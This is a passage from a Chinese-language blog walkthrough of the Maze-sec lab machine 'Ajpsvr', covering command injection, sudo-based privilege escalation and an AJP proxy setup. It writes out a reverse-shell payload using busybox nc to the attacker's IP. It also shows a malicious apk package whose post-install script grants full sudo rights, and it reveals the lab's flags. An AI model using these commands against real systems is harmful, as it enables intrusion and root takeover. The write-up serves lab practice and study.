+<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><p> 通过 URL 发送反弹 Shell 的 payload（注意 <code>+</code> 在 URL 中会被视为空格，这里是 <code>busybox</code> 多功能二进制文件的用法）<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl <span class="hljs-string">&#x27;http://192.168.2.4:8000/backdoooooooooooooooooor?cmd=__import__(&quot;os&quot;).popen(&quot;busybox+nc+192.168.2.4+4444+-e+/bin/bash&quot;).read()&#x27;</span> <br></code></pre></td></tr></table></figure></p>
+<p>成功获取到shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.59] 44001<br><span class="hljs-built_in">id</span><br>uid=1000(welcome) gid=1000(welcome) <span class="hljs-built_in">groups</span>=1000(welcome)<br></code></pre></td></tr></table></figure>
+
+<h2 id="4、稳定shell"><a href="#4、稳定shell" class="headerlink" title="4、稳定shell"></a>4、稳定shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>Ctrl+Z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>reset xterm  <br><span class="hljs-built_in">export</span> TERM=xterm  <br><span class="hljs-built_in">export</span> SHELL=/bin/bash  <br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure>
+
+<p><strong>USER FLAG</strong><br>在<code>welcome</code>用户的<code>/home</code>目录下，找到FLAG</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;5a80870310e5a3bc10c00ef6d20a3cac&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、提权至superuser"><a href="#1、提权至superuser" class="headerlink" title="1、提权至superuser"></a>1、提权至superuser</h2><p>在枚举系统时，发现一个只监听在本地 <code>127.0.0.1:5000</code> 的可疑服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:~$ netstat -lntup<br>netstat: showing only processes with your user ID<br>Active Internet connections (only servers)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    <br>tcp        0      0 0.0.0.0:8010            0.0.0.0:*               LISTEN      2850/python3<br>tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -<br>tcp        0      0 :::22                   :::*                    LISTEN      -<br>tcp        0      0 :::80                   :::*                    LISTEN      -<br></code></pre></td></tr></table></figure>
+
+<p>访问<code>5000</code>端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:~$ busybox nc 127.0.0.1 5000<br>Welcome to SignatureChain CTF over TCP!<br>Type <span class="hljs-string">&#x27;view&#x27;</span>, <span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-string">&#x27;hint&#x27;</span>, or <span class="hljs-string">&#x27;exit&#x27;</span><br>&gt; view<br>[<br>  &#123;<br>    <span class="hljs-string">&quot;index&quot;</span>: 1,<br>    <span class="hljs-string">&quot;sender&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>,<br>    <span class="hljs-string">&quot;recipient&quot;</span>: <span class="hljs-string">&quot;alice&quot;</span>,<br>    <span class="hljs-string">&quot;amount&quot;</span>: 100,<br>    <span class="hljs-string">&quot;signature&quot;</span>: <span class="hljs-string">&quot;14ed219616014b683ae66d1ec2e098c84ff09695b33fff0a7652505e260be0aa&quot;</span>,<br>    <span class="hljs-string">&quot;note&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;index&quot;</span>: 2,<br>    <span class="hljs-string">&quot;sender&quot;</span>: <span class="hljs-string">&quot;alice&quot;</span>,<br>    <span class="hljs-string">&quot;recipient&quot;</span>: <span class="hljs-string">&quot;bob&quot;</span>,<br>    <span class="hljs-string">&quot;amount&quot;</span>: 50,<br>    <span class="hljs-string">&quot;signature&quot;</span>: <span class="hljs-string">&quot;08188ce485e280ba7d8c614a776a478d75ac2e985a535d1d126117ceb59ac952&quot;</span>,<br>    <span class="hljs-string">&quot;note&quot;</span>: <span class="hljs-string">&quot;2&quot;</span><br>  &#125;<br>]<br>&gt; hint<br>[Hint 1] Use <span class="hljs-string">&#x27;view&#x27;</span> to inspect part of the blockchain.<br>[Hint 2] The signature is just sha256(sender-&gt;recipient:amount).<br>[Hint 3] Try forging a valid signature with this knowledge.<br>[Hint 4] What <span class="hljs-keyword">if</span> admin sent you 999 coins?<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>使用 <code>view</code> 查看区块链的一部分</li>
+<li>签名就是 <code>sha256(sender-&gt;recipient:amount)</code></li>
+<li>试着用这些知识伪造一个有效的签名</li>
+<li>如果管理员给你发送了 999 枚硬币呢？</li>
+</ol>
+<p>在<code>/opt/server/server.py</code>中找到代码的硬编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:/opt/server$ <span class="hljs-built_in">cat</span> server.py <br>import socket<br>import threading<br>import json<br>import hashlib<br><br>FLAG = <span class="hljs-string">&quot;flag&#123;superuser/f124cf868d5e3fa5a7de39f80a2f9a0e&#125;&quot;</span><br>.......<br></code></pre></td></tr></table></figure>
+
+<p>代码里面<code>FLAG = &quot;flag&#123;superuser/f124cf868d5e3fa5a7de39f80a2f9a0e&#125;&quot;</code>，猜测用户<code>superuser</code>的密码为<code>f124cf868d5e3fa5a7de39f80a2f9a0e</code></p>
+<p>切换用户成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:/opt/server$ su superuser<br>Password: <br>/opt/server $ <span class="hljs-built_in">id</span><br>uid=1001(superuser) gid=1001(superuser) <span class="hljs-built_in">groups</span>=300(abuild),1001(superuser)<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h2><p>检查<code>sudo</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home $ <span class="hljs-built_in">sudo</span> -l<br>User superuser may run the following commands on localhost:<br>    (ALL) NOPASSWD: /sbin/apk<br></code></pre></td></tr></table></figure>
+<p>我们可以无需密码以 root 权限运行 <code>apk</code> 命令。<code>apk</code> 是 Alpine Linux 的包管理器。我们可以创建一个包含恶意安装后脚本的自定义 <code>.apk</code> 包，然后用 <code>sudo apk</code> 来安装它。该脚本将以 root 权限执行。</p>
+<p><strong>提权步骤：</strong></p>
+<ol>
+<li><strong>创建恶意包工作目录和文件</strong><ul>
+<li><code>APKBUILD</code>：定义包名、版本等元信息。</li>
+<li><code>pwn.post-install</code>：安装后要执行的脚本。我们可以在这里写入提权命令。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建工作目录</span><br><span class="hljs-built_in">mkdir</span> /tmp/malicious-pkg<br><span class="hljs-built_in">cd</span> /tmp/malicious-pkg<br><br><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span> &gt; APKBUILD<br>pkgname=pwn<br>pkgver=1.0.0<br>pkgrel=0<br>pkgdesc=<span class="hljs-string">&quot;pwn&quot;</span><br><span class="hljs-built_in">arch</span>=<span class="hljs-string">&quot;noarch&quot;</span><br>license=<span class="hljs-string">&quot;GPL&quot;</span><br>install=<span class="hljs-string">&quot;pwn.post-install&quot;</span><br><span class="hljs-function"><span class="hljs-title">package</span></span>() &#123;<br>    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$pkgdir</span>&quot;</span><br>&#125;<br>EOF<br><br><span class="hljs-comment"># 写入恶意安装后脚本 (例如：给予 superuser 完全的 sudo 权限)</span><br><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span> &gt; pwn.post-install<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;superuser ALL=(ALL:ALL) NOPASSWD: ALL&#x27;</span> &gt;&gt; /etc/sudoers<br>EOF<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<p><strong>2.生成签名密钥并构建包</strong></p>
+<ul>
+<li><code>abuild</code> 工具需要签名密钥来构建包。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成密钥对</span><br>abuild-keygen -a<br><span class="hljs-comment"># 构建包</span><br>abuild checksum<br>abuild -r<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p> <strong>3.安装恶意包并提权</strong></p>
+<ul>
+<li>使用 <code>sudo apk add</code> 并加上 <code>--allow-untrusted</code> 选项来安装我们自己构建的未签名包。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apk add --allow-untrusted /home/superuser/packages/tmp/x86_64/pwn-1.0.0-r0.apk <br></code></pre></td></tr></table></figure>
+安装过程中，<code>pwn.post-install</code> 脚本会被 root 执行，<code>superuser</code> 用户现在拥有了无密码执行任何 <code>sudo</code> 命令的权限。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:/tmp/malicious-pkg$ <span class="hljs-built_in">sudo</span> -l<br>User superuser may run the following commands on localhost:<br>    (ALL) NOPASSWD: /sbin/apk<br>    (ALL : ALL) NOPASSWD: ALL<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>4.获取ROOT shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">localhost:/tmp/malicious-pkg$ <span class="hljs-built_in">sudo</span> su<br>/tmp/malicious-pkg <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),...<br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/malicious-pkg <span class="hljs-comment"># cat /root/root.txt</span><br>flag&#123;bd941f8fb8a7b5b1c34bd71a349d6d04&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、AJP服务"><a href="#1、AJP服务" class="headerlink" title="1、AJP服务"></a>1、AJP服务</h2><p><strong>什么是 AJP？</strong></p>
+<ul>
+<li>AJP服务是指基于Apache JServ Protocol（AJP）协议的应用服务，主要用于Web服务器与Servlet容器（如Tomcat）之间的高效通信。</li>
+<li>AJP是一种<strong>定向包协议</strong>，通过<strong>二进制格式</strong>传输数据（而非HTTP的纯文本），旨在提升Web服务器与应用服务器间的通信效率。它允许Web服务器（如Apache HTTP Server）将请求转发给后端的Servlet容器处理，常用于负载均衡或反向代理场景。&#96;</li>
+</ul>
+<p><strong>代理配置步骤：</strong></p>
+<ol>
+<li>启用Apache的相关代理模块<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install apache2<br><span class="hljs-built_in">sudo</span> a2enmod proxy    <br><span class="hljs-built_in">sudo</span> a2enmod proxy_http<br><span class="hljs-built_in">sudo</span> a2enmod proxy_ajp        <br></code></pre></td></tr></table></figure></li>
+<li>创建一个新的 Apache 站点配置文件 <code>/etc/apache2/sites-available/ajp-proxy.conf</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Listen 8000<br>&lt;VirtualHost *:8000&gt;<br>    ProxyPass / ajp://192.168.2.59:8010/<br>    ProxyPassReverse / ajp://192.168.2.59:8010/<br>&lt;/VirtualHost&gt;<br></code></pre></td></tr></table></figure></li>
+<li>启用该站点并重启 Apache 服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> a2ensite ajp-proxy.conf<br><span class="hljs-built_in">sudo</span> systemctl restart apache2<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>配置完成后，访问我们自己机器的 <code>http://127.0.0.1:8000</code> (或 <code>http://192.168.2.4:8000</code>) 就相当于在访问目标 <code>192.168.2.59:8010</code> 上的 Web 应用</p>
+<h2 id="2、提权-apk"><a href="#2、提权-apk" class="headerlink" title="2、提权-apk"></a>2、提权-apk</h2><p><code>apk</code> 是 Alpine Linux 的包管理器。我们可以创建一个包含恶意安装后脚本的自定义 <code>.apk</code> 包，然后用 <code>sudo apk</code> 来安装它。该脚本将以 root 权限执行。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ajp%E6%9C%8D%E5%8A%A1%EF%BC%8C%E6%8F%90%E6%9D%83-apk/" class="print-no-link">#ajp服务，提权-apk</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Ajpsvr</div>
+      <div>http://miao-sec.github.io/Maze-sec/Ajpsvr/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Maze-sec/5ud0/" title="5ud0">
+                        <span class="hidden-mobile">5ud0</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <link rel="stylesheet" href="/dist/APlayer.min.css"> <div id="aplayer"></div> <script type="text/javascript" src="/dist/APlayer.min.js"></script> <script type="text/javascript" src="/js/music.js"></script> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
